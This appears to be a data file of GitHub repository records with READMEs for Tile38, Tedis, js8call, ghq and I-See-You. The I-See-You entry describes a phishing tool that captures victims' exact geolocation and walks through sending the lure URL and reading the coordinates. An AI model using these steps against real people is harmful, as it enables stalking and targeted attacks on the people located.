{"tags": [], "owner": "tidwall", "description": "Real-time Geospatial and Geofencing", "name": "tile38", "topics_string": "", "language": "Go", "readme": "\"<p align=\\\"center\\\">\\n <a href=\\\"https://tile38.com\\\"><img \\n src=\\\"/.github/images/logo.png\\\" \\n width=\\\"284\\\" height=\\\"108\\\" border=\\\"0\\\" alt=\\\"Tile38\\\"></a>\\n</p>\\n<p align=\\\"center\\\">\\n<a href=\\\"https://tile38.com/slack\\\"><img src=\\\"https://img.shields.io/badge/slack-channel-orange.svg\\\" alt=\\\"Slack Channel\\\"></a>\\n<a href=\\\"https://travis-ci.org/tidwall/tile38\\\"><img src=\\\"https://travis-ci.org/tidwall/tile38.svg?branch=master\\\" alt=\\\"Build Status\\\"></a>\\n<a href=\\\"https://hub.docker.com/r/tile38/tile38\\\"><img src=\\\"https://img.shields.io/badge/docker-ready-blue.svg\\\" alt=\\\"Docker Ready\\\"></a>\\n</p>\\n\\nTile38 is an open source (MIT licensed), in-memory geolocation data store, spatial index, and realtime geofence. It supports a variety of object types including lat/lon points, bounding boxes, XYZ tiles, Geohashes, and GeoJSON. \\n\\n<p align=\\\"center\\\">\\n<i>This README is quick start document. You can find detailed documentation at <a href=\\\"https://tile38.com\\\">https://tile38.com</a>.</i><br><br>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-nearby.png\\\" alt=\\\"Nearby\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-within.png\\\" alt=\\\"Within\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-intersects.png\\\" alt=\\\"Intersects\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"https://tile38.com/topics/geofencing\\\"><img src=\\\"/.github/images/geofence.gif\\\" alt=\\\"Geofencing\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"https://tile38.com/topics/roaming-geofences\\\"><img src=\\\"/.github/images/roaming.gif\\\" alt=\\\"Roaming Geofences\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n</p>\\n\\n## Features\\n\\n- Spatial index with [search](#searching) methods such as Nearby, Within, and Intersects.\\n- Realtime [geofencing](#geofencing) through [webhooks](https://tile38.com/commands/sethook) or [pub/sub channels](#pubsub-channels).\\n- Object types of [lat/lon](#latlon-point), [bbox](#bounding-box), [Geohash](#geohash), [GeoJSON](#geojson), [QuadKey](#quadkey), and [XYZ tile](#xyz-tile).\\n- Support for lots of [Clients Libraries](#client-libraries) written in many different languages.\\n- Variety of protocols, including [http](#http) (curl), [websockets](#websockets), [telnet](#telnet), and the [Redis RESP](https://redis.io/topics/protocol).\\n- Server responses are [RESP](https://redis.io/topics/protocol) or [JSON](https://www.json.org).\\n- Full [command line interface](#cli).\\n- Leader / follower [replication](#replication).\\n- In-memory database that persists on disk.\\n\\n## Components\\n- `tile38-server ` - The server\\n- `tile38-cli ` - Command line interface tool\\n- `tile38-benchmark ` - Server benchmark tool\\n\\n## Getting Started\\n\\n### Getting Tile38\\n\\nPerhaps the easiest way to get the latest Tile38 is to use one of the pre-built release binaries which are available for OSX, Linux, FreeBSD, and Windows. Instructions for using these binaries are on the GitHub [releases page](https://github.com/tidwall/tile38/releases).\\n\\n### Docker \\n\\nTo run the latest stable version of Tile38:\\n\\n```\\ndocker pull tile38/tile38\\ndocker run -p 9851:9851 tile38/tile38\\n```\\n\\nVisit the [Tile38 hub page](https://hub.docker.com/r/tile38/tile38/) for more information.\\n\\n### Homebrew (macOS)\\n\\nInstall Tile38 using [Homebrew](https://brew.sh/)\\n\\n```sh\\nbrew install tile38\\ntile38-server\\n```\\n\\n### Building Tile38 \\n\\nTile38 can be compiled and used on Linux, OSX, Windows, FreeBSD, and probably others since the codebase is 100% Go. We support both 32 bit and 64 bit systems. [Go](https://golang.org/dl/) must be installed on the build machine.\\n\\nTo build everything simply:\\n```\\n$ make\\n```\\n\\nTo test:\\n```\\n$ make test\\n```\\n\\n### Running \\nFor command line options invoke:\\n```\\n$ ./tile38-server -h\\n```\\n\\nTo run a single server:\\n\\n```\\n$ ./tile38-server\\n\\n# The tile38 shell connects to localhost:9851\\n$ ./tile38-cli\\n> help\\n```\\n\\n## <a name=\\\"cli\\\"></a>Playing with Tile38\\n\\nBasic operations:\\n```\\n$ ./tile38-cli\\n\\n# add a couple of points named 'truck1' and 'truck2' to a collection named 'fleet'.\\n> set fleet truck1 point 33.5123 -112.2693 # on the Loop 101 in Phoenix\\n> set fleet truck2 point 33.4626 -112.1695 # on the I-10 in Phoenix\\n\\n# search the 'fleet' collection.\\n> scan fleet # returns both trucks in 'fleet'\\n> nearby fleet point 33.462 -112.268 6000 # search 6 kilometers around a point. returns one truck.\\n\\n# key value operations\\n> get fleet truck1 # returns 'truck1'\\n> del fleet truck2 # deletes 'truck2'\\n> drop fleet # removes all \\n```\\n\\nTile38 has a ton of [great commands](https://tile38.com/commands).\\n\\n## Fields\\nFields are extra data that belongs to an object. A field is always a double precision floating point. There is no limit to the number of fields that an object can have. \\n\\nTo set a field when setting an object:\\n```\\n> set fleet truck1 field speed 90 point 33.5123 -112.2693 \\n> set fleet truck1 field speed 90 field age 21 point 33.5123 -112.2693\\n```\\n\\nTo set a field when an object already exists:\\n```\\n> fset fleet truck1 speed 90\\n```\\n\\n## Searching\\n\\nTile38 has support to search for objects and points that are within or intersects other objects. All object types can be searched including Polygons, MultiPolygons, GeometryCollections, etc.\\n\\n<img src=\\\"/.github/images/search-within.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Within\\\" align=\\\"left\\\">\\n\\n#### Within \\nWITHIN searches a collection for objects that are fully contained inside a specified bounding area.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n<img src=\\\"/.github/images/search-intersects.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Intersects\\\" align=\\\"left\\\">\\n\\n#### Intersects\\nINTERSECTS searches a collection for objects that intersect a specified bounding area.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n<img src=\\\"/.github/images/search-nearby.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Nearby\\\" align=\\\"left\\\">\\n\\n#### Nearby\\nNEARBY searches a collection for objects that intersect a specified radius.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n### Search options\\n**SPARSE** - This option will distribute the results of a search evenly across the requested area. \\nThis is very helpful for example; when you have many (perhaps millions) of objects and do not want them all clustered together on a map. Sparse will limit the number of objects returned and provide them evenly distributed so that your map looks clean.<br><br>\\nYou can choose a value between 1 and 8. The value 1 will result in no more than 4 items. The value 8 will result in no more than 65536. *1=4, 2=16, 3=64, 4=256, 5=1024, 6=4098, 7=16384, 8=65536.*<br><br>\\n<table>\\n<td>No Sparsing<img src=\\\"/.github/images/sparse-none.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 1<img src=\\\"/.github/images/sparse-1.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 2<img src=\\\"/.github/images/sparse-2.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 3<img src=\\\"/.github/images/sparse-3.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 4<img src=\\\"/.github/images/sparse-4.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 5<img src=\\\"/.github/images/sparse-5.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n</table>\\n\\n*Please note that the higher the sparse value, the slower the performance. Also, LIMIT and CURSOR are not available when using SPARSE.* \\n\\n**WHERE** - This option allows for filtering out results based on [field](#fields) values. For example<br>```nearby fleet where speed 70 +inf point 33.462 -112.268 6000``` will return only the objects in the 'fleet' collection that are within the 6 km radius **and** have a field named `speed` that is greater than `70`. <br><br>Multiple WHEREs are concatenated as **and** clauses. ```WHERE speed 70 +inf WHERE age -inf 24``` would be interpreted as *speed is over 70 <b>and</b> age is less than 24.*<br><br>The default value for a field is always `0`. Thus if you do a WHERE on the field `speed` and an object does not have that field set, the server will pretend that the object does and that the value is Zero.\\n\\n**MATCH** - MATCH is similar to WHERE except that it works on the object id instead of fields.<br>```nearby fleet match truck* point 33.462 -112.268 6000``` will return only the objects in the 'fleet' collection that are within the 6 km radius **and** have an object id that starts with `truck`. There can be multiple MATCH options in a single search. The MATCH value is a simple [glob pattern](https://en.wikipedia.org/wiki/Glob_(programming)).\\n\\n**CURSOR** - CURSOR is used to iterate though many objects from the search results. An iteration begins when the CURSOR is set to Zero or not included with the request, and completes when the cursor returned by the server is Zero.\\n\\n**NOFIELDS** - NOFIELDS tells the server that you do not want field values returned with the search results.\\n\\n**LIMIT** - LIMIT can be used to limit the number of objects returned for a single search request.\\n\\n\\n## Geofencing\\n\\n<img src=\\\"/.github/images/geofence.gif\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Geofence animation\\\" align=\\\"left\\\">\\nA <a href=\\\"https://en.wikipedia.org/wiki/Geo-fence\\\">geofence</a> is a virtual boundary that can detect when an object enters or exits the area. This boundary can be a radius, bounding box, or a polygon. Tile38 can turn any standard search into a geofence monitor by adding the FENCE keyword to the search. \\n\\n*Tile38 also allows for [Webhooks](https://tile38.com/commands/sethook) to be assigned to Geofences.*\\n\\n<br clear=\\\"all\\\">\\n\\nA simple example:\\n```\\n> nearby fleet fence point 33.462 -112.268 6000\\n```\\nThis command opens a geofence that monitors the 'fleet' collection. The server will respond with:\\n```\\n{\\\"ok\\\":true,\\\"live\\\":true}\\n```\\nAnd the connection will be kept open. If any object enters or exits the 6 km radius around `33.462,-112.268` the server will respond in realtime with a message such as:\\n\\n```\\n{\\\"command\\\":\\\"set\\\",\\\"detect\\\":\\\"enter\\\",\\\"id\\\":\\\"truck02\\\",\\\"object\\\":{\\\"type\\\":\\\"Point\\\",\\\"coordinates\\\":[-112.2695,33.4626]}}\\n```\\n\\nThe server will notify the client if the `command` is `del | set | drop`. \\n\\n- `del` notifies the client that an object has been deleted from the collection that is being fenced.\\n- `drop` notifies the client that the entire collection is dropped.\\n- `set` notifies the client that an object has been added or updated, and when it's position is detected by the fence.\\n\\nThe `detect` may be one of the following values.\\n\\n- `inside` is when an object is inside the specified area.\\n- `outside` is when an object is outside the specified area.\\n- `enter` is when an object that **was not** previously in the fence has entered the area.\\n- `exit` is when an object that **was** previously in the fence has exited the area.\\n- `cross` is when an object that **was not** previously in the fence has entered **and** exited the area.\\n\\nThese can be used when establishing a geofence, to pre-filter responses. For instance, to limit responses to `enter` and `exit` detections:\\n\\n```\\n> nearby fleet fence detect enter,exit point 33.462 -112.268 6000\\n```\\n\\n### Pub/sub channels\\n\\nTile38 supports delivering geofence notications over pub/sub channels. \\n\\nTo create a static geofence that sends notifications when a bus is within 200 meters of a point and sends to the `busstop` channel:\\n\\n```\\n> setchan busstop nearby buses fence point 33.5123 -112.2693 200\\n```\\n\\nSubscribe on the `busstop` channel:\\n\\n```\\n> subscribe busstop\\n```\\n\\n## Object types\\n\\nAll object types except for XYZ Tiles and QuadKeys can be stored in a collection. XYZ Tiles and QuadKeys are reserved for the SEARCH keyword only.\\n\\n#### Lat/lon point\\nThe most basic object type is a point that is composed of a latitude and a longitude. There is an optional `z` member that may be used for auxiliary data such as elevation or a timestamp.\\n```\\nset fleet truck1 point 33.5123 -112.2693 # plain lat/lon\\nset fleet truck1 point 33.5123 -112.2693 225 # lat/lon with z member\\n```\\n\\n#### Bounding box\\nA bounding box consists of two points. The first being the southwestern most point and the second is the northeastern most point.\\n```\\nset fleet truck1 bounds 30 -110 40 -100\\n```\\n#### Geohash\\nA [geohash](https://en.wikipedia.org/wiki/Geohash) is a string representation of a point. With the length of the string indicating the precision of the point. \\n```\\nset fleet truck1 hash 9tbnthxzr # this would be equivalent to 'point 33.5123 -112.2693'\\n```\\n\\n#### GeoJSON\\n[GeoJSON](https://tools.ietf.org/html/rfc7946) is an industry standard format for representing a variety of object types including a point, multipoint, linestring, multilinestring, polygon, multipolygon, geometrycollection, feature, and featurecollection.\\n\\n<i>* All ignored members will not persist.</i>\\n\\n**Important to note that all coordinates are in Longitude, Latitude order.**\\n\\n```\\nset city tempe object {\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[0,0],[10,10],[10,0],[0,0]]]}\\n```\\n\\n#### XYZ Tile\\nAn XYZ tile is rectangle bounding area on earth that is represented by an X, Y coordinate and a Z (zoom) level.\\nCheck out [maptiler.org](http://www.maptiler.org/google-maps-coordinates-tile-bounds-projection/) for an interactive example.\\n\\n#### QuadKey\\nA QuadKey used the same coordinate system as an XYZ tile except that the string representation is a string characters composed of 0, 1, 2, or 3. For a detailed explanation checkout [The Bing Maps Tile System](https://msdn.microsoft.com/en-us/library/bb259689.aspx).\\n\\n\\n## Network protocols\\n\\nIt's recommended to use a [client library](#client-libraries) or the [Tile38 CLI](#running), but there are times when only HTTP is available or when you need to test from a remote terminal. In those cases we provide an HTTP and telnet options.\\n\\n#### HTTP\\nOne of the simplest ways to call a tile38 command is to use HTTP. From the command line you can use [curl](https://curl.haxx.se/). For example:\\n\\n```\\n# call with request in the body\\ncurl --data \\\"set fleet truck3 point 33.4762 -112.10923\\\" localhost:9851\\n\\n# call with request in the url path\\ncurl localhost:9851/set+fleet+truck3+point+33.4762+-112.10923\\n```\\n\\n#### Websockets\\nWebsockets can be used when you need to Geofence and keep the connection alive. It works just like the HTTP example above, with the exception that the connection stays alive and the data is sent from the server as text websocket messages.\\n\\n#### Telnet\\nThere is the option to use a plain telnet connection. The default output through telnet is [RESP](https://redis.io/topics/protocol).\\n\\n```\\ntelnet localhost 9851\\nset fleet truck3 point 33.4762 -112.10923\\n+OK\\n\\n```\\n\\nThe server will respond in [JSON](https://json.org) or [RESP](https://redis.io/topics/protocol) depending on which protocol is used when initiating the first command.\\n\\n- HTTP and Websockets use JSON. \\n- Telnet and RESP clients use RESP.\\n\\n## Client Libraries\\n\\nTile38 uses the [Redis RESP](https://redis.io/topics/protocol) protocol natively. Therefore most clients that support basic Redis commands will in turn support Tile38. Below are a few of the popular clients. \\n\\n- C: [hiredis](https://github.com/redis/hiredis)\\n- C#: [StackExchange.Redis](https://github.com/StackExchange/StackExchange.Redis)\\n- C++: [redox](https://github.com/hmartiro/redox)\\n- Clojure: [carmine](https://github.com/ptaoussanis/carmine)\\n- Common Lisp: [CL-Redis](https://github.com/vseloved/cl-redis)\\n- Erlang: [Eredis](https://github.com/wooga/eredis)\\n- Go: [go-redis](https://github.com/go-redis/redis) ([example code](https://github.com/tidwall/tile38/wiki/Go-example-(go-redis)))\\n- Go: [redigo](https://github.com/gomodule/redigo) ([example code](https://github.com/tidwall/tile38/wiki/Go-example-(redigo)))\\n- Haskell: [hedis](https://github.com/informatikr/hedis)\\n- Java: [lettuce](https://github.com/mp911de/lettuce) ([example code](https://github.com/tidwall/tile38/wiki/Java-example-(lettuce)))\\n- Node.js: [node-tile38](https://github.com/phulst/node-tile38) ([example code](https://github.com/tidwall/tile38/wiki/Node.js-example-(node-tile38)))\\n- Node.js: [node_redis](https://github.com/NodeRedis/node_redis) ([example code](https://github.com/tidwall/tile38/wiki/Node.js-example-(node-redis)))\\n- Perl: [perl-redis](https://github.com/PerlRedis/perl-redis)\\n- PHP: [tinyredisclient](https://github.com/ptrofimov/tinyredisclient) ([example code](https://github.com/tidwall/tile38/wiki/PHP-example-(tinyredisclient)))\\n- PHP: [phpredis](https://github.com/phpredis/phpredis)\\n- Python: [redis-py](https://github.com/andymccurdy/redis-py) ([example code](https://github.com/tidwall/tile38/wiki/Python-example))\\n- Ruby: [redic](https://github.com/amakawa/redic) ([example code](https://github.com/tidwall/tile38/wiki/Ruby-example-(redic)))\\n- Ruby: [redis-rb](https://github.com/redis/redis-rb) ([example code](https://github.com/tidwall/tile38/wiki/Ruby-example-(redis-rb)))\\n- Rust: [redis-rs](https://github.com/mitsuhiko/redis-rs)\\n- Scala: [scala-redis](https://github.com/debasishg/scala-redis)\\n- Swift: [Redbird](https://github.com/czechboy0/Redbird)\\n\\n## Contact\\n\\nJosh Baker [@tidwall](https://twitter.com/tidwall)\\n\\n## License\\n\\nTile38 source code is available under the MIT [License](/LICENSE).\\n\"", "topics": ["database", "geojson", "gis", "geo", "spatial", "geospatial", "geofence", "geolocation"], "writeup": "Tile38 is an open source (MIT licensed), in-memory geolocation data store, spatial index, and realtime geofence. It supports a variety of object types including lat/lon points, bounding boxes, XYZ tiles, Geohashes, and GeoJSON. \n", "ignoredescription": true, "id": 99, "full_name": "tidwall/tile38", "url": "https://github.com/tidwall/tile38", "topic_string": "database geojson gis geo spatial geospatial geofence geolocation"},
{"tags": [], "owner": "Viralmaniar", "description": "ISeeYou is a Bash and Javascript tool to find the exact location of the users during social engineering or phishing engagements. Using exact location coordinates an attacker can perform preliminary reconnaissance which will help them in performing further targeted attacks.", "name": "I-See-You", "topics_string": "", "language": "Shell", "readme": "\"# I-See-You\\n\\nISeeYou is a Bash and Javascript tool to find the exact location of the users during social engineering or phishing engagements. Using exact location coordinates an attacker can perform preliminary reconnaissance which will help them in performing further targeted attacks. \\n\\n<B>Note:</B><Br>\\n- This tool does not require any additional software to perform phishing attacks.\\n- Users can expose their local servers to the Internet and decode the location coordinates by looking at the log file.\\n \\n<B><I>This project must not be used for illegal purposes for stalking people or hacking into system where you do not have permission, it is strictly for educational purposes and for people to experiment with.</I></B>\\n \\nAny suggestions or ideas for this tool are welcome - just tweet me on [@ManiarViral](https://twitter.com/maniarviral)\\n\\n![image](https://user-images.githubusercontent.com/3501170/55272562-2d894b80-5312-11e9-8fec-0be64a00c317.png)\\n\\n# How to install?\\n\\n<pre>\\ngit clone https://github.com/Viralmaniar/I-See-You.git\\ncd I-See-You\\nchmod u+x ISeeYou.sh\\n./ISeeYou.sh\\n</pre>\\n![image](https://user-images.githubusercontent.com/3501170/55271795-e9447e00-5306-11e9-8a52-30251d1fc156.png)\\n\\n# Screenshots\\n\\nOnce the `ISeeYou.sh` is ran user sees the below screen:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271919-00846b00-5309-11e9-8002-1007022ed323.png)\\n\\nEnter the highlighted url on the main screen where it asks for `Enter the URL generated by Serveo` and hit `Enter`:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271934-3aee0800-5309-11e9-86bc-6cd1c843e635.png)\\n\\nThis URL is generated randomly for different users. However, it will be a subdomain for the serveo.net domain. Send this URL to your victim as part of the phishing campaign via email or any other medium. Victim will see the site as below:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271752-34aa5c80-5306-11e9-87b2-fa4f54321fe3.png)\\n\\nNote: You can be creative and modify the look and feel of the page as per your requirement.\\n\\nOnce the targeted users allows location permission, malicious user will receive exact location of the victim in the tail screen. These numbers are `longitude and latitude` of the user.\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271965-cbc4e380-5309-11e9-8dca-5a1f5933c1c7.png)\\n\\nUsing `https://maps.google.com` you can convert the `longitude and latitude` to an exact location:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271991-4e4da300-530a-11e9-91ec-2fb83ef46461.png)\\n\\n# Copying Longitude and Latitude numbers from Xterm screens\\n\\nTo copy between xterm and other programs - This would allow user to select numbers to be copied to the clipboard.\\n1. Add to the file ~/.Xresources (or create)\\n\\n2.\\n<pre>\\nXTerm*selectToClipboard: true\\n</pre>\\n3. Then run the command:\\n<pre>\\nxrdb -merge ~/.Xresources\\n</pre>\\n4. Restart xterm.\\n\\n# Questions?\\n\\nTwitter: https://twitter.com/maniarviral <br>\\nLinkedIn: https://au.linkedin.com/in/viralmaniar\\n\\n# Contribution & License\\n\\n<a rel=\\\"license\\\" href=\\\"http://creativecommons.org/licenses/by/4.0/\\\"><img alt=\\\"Creative Commons License\\\" style=\\\"border-width:0\\\" src=\\\"https://i.creativecommons.org/l/by/4.0/80x15.png\\\" /></a><br />This work is licensed under a <a rel=\\\"license\\\" href=\\\"http://creativecommons.org/licenses/by/4.0/\\\">Creative Commons Attribution 4.0 International License</a>.</br>\\nWant to contribute? Please fork it and hit up with a pull request.\\n\\nAny suggestions or ideas for this tool are welcome - just tweet me on [@ManiarViral](https://twitter.com/maniarviral)\\n\\n# Thanks\\n\\nSpecial thanks to cryptomarauder aka voidengineer\\n\"", "topics": ["redteam", "osint", "geotargeting", "reconnaissance", "socialengineering", "phishing", "geolocation"], "writeup": "", "ignoredescription": false, "id": 100, "full_name": "Viralmaniar/I-See-You", "url": "https://github.com/Viralmaniar/I-See-You", "topic_string": "redteam osint geotargeting reconnaissance socialengineering phishing geolocation"},
{"tags": [], "owner": "vvondra", "description": "Tile38 UI written in Electron", "name": "tedis", "topics_string": "", "language": "JavaScript", "readme": "\"# Tedis\\n\\n![Tedis](./screen.png)\\n\\n[![Build Status](https://travis-ci.org/vvondra/tedis.svg?branch=master)](https://travis-ci.org/vvondra/tedis)\\n\\nTedis is a beautiful, easy-to-use [Tile38](http://tile38.com/) management application built on the modern web with [Electron](https://github.com/atom/electron), [React](https://facebook.github.io/react/), and [Redux](https://github.com/rackt/redux). It's powered by many awesome Node.js modules, especially [ioredis](https://github.com/luin/ioredis) and [ssh2](https://github.com/mscdex/ssh2).\\n\\nIt is a fork of [Medis](http://getmedis.com/), a UI for Redis. Since Tile38 supports the Redis RESP protocol, many of the features and core functionalities of Medis could be re-used and build upon. Many thanks to the original creators!\\n\\nTedis starts with all the basic features you need:\\n\\n* Keys viewing/editing\\n* SSH Tunnel for connecting with remote servers\\n* Terminal for executing custom commands\\n* Config viewing/editing\\n* Visualizing GeoJSON on a rendered map canvas\\n\\nIt also supports many advanced features:\\n\\n* Working with millions keys and key members without blocking the redis server\\n* Pattern manager for easy selecting a sub group of keys.\\n\\n## Download Tedis\\n\\n*Coming soon*\\n\\n## Running Locally\\n\\n\\n\\n```bash\\n#\\u00a01. Install dependencies\\nnpm install\\n\\n# 2. Compile assets\\nnpm run build\\n\\n# 3. Launch electron app\\nnpm run electron\\n```\\n\\n## License\\n\\nMIT\\n\"", "topics": ["tile38"], "writeup": "", "ignoredescription": false, "id": 101, "full_name": "vvondra/tedis", "url": "https://github.com/vvondra/tedis", "topic_string": "tile38"},
{"tags": [], "owner": "widefido", "description": "", "name": "widefido/js8call", "topics_string": "", "language": "C++", "readme": "", "topics": ["radio", "ham", "js8", "sdr"], "writeup": "S8Call is an experiment in combining the robustness of FT8 (a weak-signal mode by K1JT) with a messaging and network protocol layer for weak signal communication. The open source software is designed for connecting amateur radio operators who are operating under weak signal conditions and offers real-time keyboard-to-keyboard messaging, store-and-forward messaging, and automatic station announcements. Read more on the original design inspiration here: https://github.com/jsherer/js8call For release announcements and discussion, join the JS8Call mailing list here: https://groups.io/g/js8call Documentation is available here: https://docs.google.com/document/d/159S4wqMUVdMA7qBgaSWmU-iDI4C9wd4CuWnetN68O9U/edit?pli=1#heading=h.kfnyge37yfr\n", "ignoredescription": false, "id": 102, "full_name": "widefido/js8call", "url": "https://github.com/widefido/js8call", "topic_string": "radio ham js8 sdr"},
{"tags": [], "owner": "x-motemen", "description": "Remote repository management made easy", "name": "ghq", "topics_string": "", "language": "Go", "readme": "\"= ghq(1) image:https://github.com/x-motemen/ghq/workflows/test/badge.svg?branch=master[\\\"Build Status\\\", link=\\\"https://github.com/x-motemen/ghq/actions?workflow=test\\\"] image:https://coveralls.io/repos/motemen/ghq/badge.svg?branch=master[\\\"Coverage\\\", link=\\\"https://coveralls.io/r/motemen/ghq?branch=master\\\"]\\n\\n== NAME\\n\\nghq - Manage remote repository clones\\n\\n== DESCRIPTION\\n\\n'ghq' provides a way to organize remote repository clones, like +go get+ does. When you clone a remote repository by +ghq get+, ghq makes a directory under a specific root directory (by default +~/ghq+) using the remote repository URL's host and path.\\n\\n $ ghq get https://github.com/x-motemen/ghq\\n # Runs `git clone https://github.com/x-motemen/ghq ~/ghq/github.com/x-motemen/ghq`\\n\\nYou can also list local repositories (+ghq list+).\\n\\n== SYNOPSIS\\n\\n[verse]\\nghq get [-u] [-p] [--shallow] [--vcs <vcs>] [--look] [--silent] [--branch] [--no-recursive] <repository URL>|<host>/<user>/<project>|<user>/<project>|<project>\\nghq list [-p] [-e] [<query>]\\nghq create [--vcs <vcs>] <repository URL>|<host>/<user>/<project>|<user>/<project>|<project>\\nghq root [--all]\\n\\n== COMMANDS\\n\\nget::\\n Clone a remote repository under ghq root directory (see\\n <<directory-structures,DIRECTORY STRUCTURES>> below). If the repository is\\n already cloned to local, nothing will happen unless '-u' ('--update')\\n flag is supplied, in which case the local repository is updated ('git pull --ff-only' eg.).\\n When you use '-p' option, the repository is cloned via SSH protocol. +\\n If there are multiple +ghq.root+ s, existing local clones are searched\\n first. Then a new repository clone is created under the primary root if\\n none is found. +\\n With '--shallow' option, a \\\"shallow clone\\\" will be performed (for Git\\n repositories only, 'git clone --depth 1 ...' eg.). Be careful that a\\n shallow-cloned repository cannot be pushed to remote.\\n Currently Git and Mercurial repositories are supported. +\\n With '--branch' option, you can clone the repository with specified\\n repository. This option is currently supported for Git, Mercurial,\\n Subversion and git-svn. +\\n The 'ghq' gets the git repository recursively by default. +\\n We can prevent it with '--no-recursive' option.\\n\\nlist::\\n List locally cloned repositories. If a query argument is given, only\\n repositories whose names contain that query text are listed. '-e'\\n ('--exact') forces the match to be an exact one (i.e. the query equals to\\n _project_, _user_/_project_ or _host_/_user_/_project_)\\n If '-p' ('--full-path') is given, the full paths to the repository root are\\n printed instead of relative ones.\\n\\nroot::\\n Prints repositories' root (i.e. `ghq.root`). Without '--all' option, the\\n primary one is shown.\\n\\ncreate::\\n Creates new repository.\\n\\n== CONFIGURATION\\n\\nConfiguration uses 'git-config' variables.\\n\\nghq.root::\\n The path to directory under which cloned repositories are placed. See\\n <<directory-structures,DIRECTORY STRUCTURES>> below. Defaults to +~/ghq+. +\\n This variable can have multiple values. If so, the last one becomes\\n primary one i.e. new repository clones are always created under it. You may\\n want to specify \\\"$GOPATH/src\\\" as a secondary root (environment variables\\n should be expanded.)\\n\\nghq.<url>.vcs::\\n ghq tries to detect the remote repository's VCS backend for non-\\\"github.com\\\"\\n repositories. With this option you can explicitly specify the VCS for the\\n remote repository. The URL is matched against '<url>' using 'git config --get-urlmatch'. +\\n Accepted values are \\\"git\\\", \\\"github\\\" (an alias for \\\"git\\\"), \\\"subversion\\\",\\n \\\"svn\\\" (an alias for \\\"subversion\\\"), \\\"git-svn\\\", \\\"mercurial\\\", \\\"hg\\\" (an alias for \\\"mercurial\\\"),\\n \\\"darcs\\\", \\\"fossil\\\", \\\"bazaar\\\", and \\\"bzr\\\" (an alias for \\\"bazaar\\\"). +\\n To get this configuration variable effective, you will need Git 1.8.5 or higher.\\n\\nghq.<url>.root::\\n The \\\"ghq\\\" tries to detect the remote repository-specific root directory. With this option,\\n you can specify a repository-specific root directory instead of the common ghq root directory. +\\n The URL is matched against '<url>' using 'git config --get-urlmatch'.\\n\\n\\n=== Example configuration (.gitconfig):\\n\\n....\\n[ghq \\\"https://git.example.com/repos/\\\"]\\nvcs = git\\nroot = ~/myproj\\n....\\n\\n== ENVIRONMENT VARIABLES\\n\\nGHQ_ROOT::\\n If set to a path, this value is used as the only root directory regardless\\n of other existing ghq.root settings.\\n\\n== [[directory-structures]]DIRECTORY STRUCTURES\\n\\nLocal repositories are placed under 'ghq.root' with named github.com/_user_/_repo_.\\n\\n....\\n~/ghq\\n|-- code.google.com/\\n| `-- p/\\n| `-- vim/\\n`-- github.com/\\n |-- google/\\n | `-- go-github/\\n |-- motemen/\\n | `-- ghq/\\n `-- urfave/\\n `-- cli/\\n....\\n\\n\\n== [[installing]]INSTALLATION\\n\\n=== macOS\\n\\n----\\nbrew install ghq\\n----\\n\\n=== Void Linux\\n\\n----\\nxbps-install -S ghq\\n----\\n\\n=== Windows + scoop\\n\\n----\\nscoop install ghq\\n----\\n\\n\\n=== go get\\n\\n----\\ngo get github.com/x-motemen/ghq\\n----\\n\\n=== conda\\n\\n----\\nconda install -c conda-forge go-ghq\\n----\\n\\n=== build\\n\\n----\\ngit clone https://github.com/x-motemen/ghq .\\nmake install\\n----\\n\\nBuilt binaries are available from GitHub Releases.\\nhttps://github.com/x-motemen/ghq/releases\\n\\n== HANDBOOK\\n\\nYou can buy \\\"ghq-handbook\\\" from Leanpub for more detailed usage.\\n\\nhttps://leanpub.com/ghq-handbook (Currently Japanese Only)\\n\\nThe source Markdown files of this book are also available for free from the following repository.\\n\\nhttps://github.com/Songmu/ghq-handbook\\n\\n== AUTHOR\\n\\n* motemen <motemen@gmail.com>\\n** https://github.com/sponsors/motemen\\n* Songmu <y.songmu@gmail.com>\\n** https://github.com/sponsors/Songmu\\n\"", "topics": ["cli", "github"], "writeup": "", "ignoredescription": false, "id": 103, "full_name": "x-motemen/ghq", "url": "https://github.com/x-motemen/ghq", "topic_string": "cli github"},
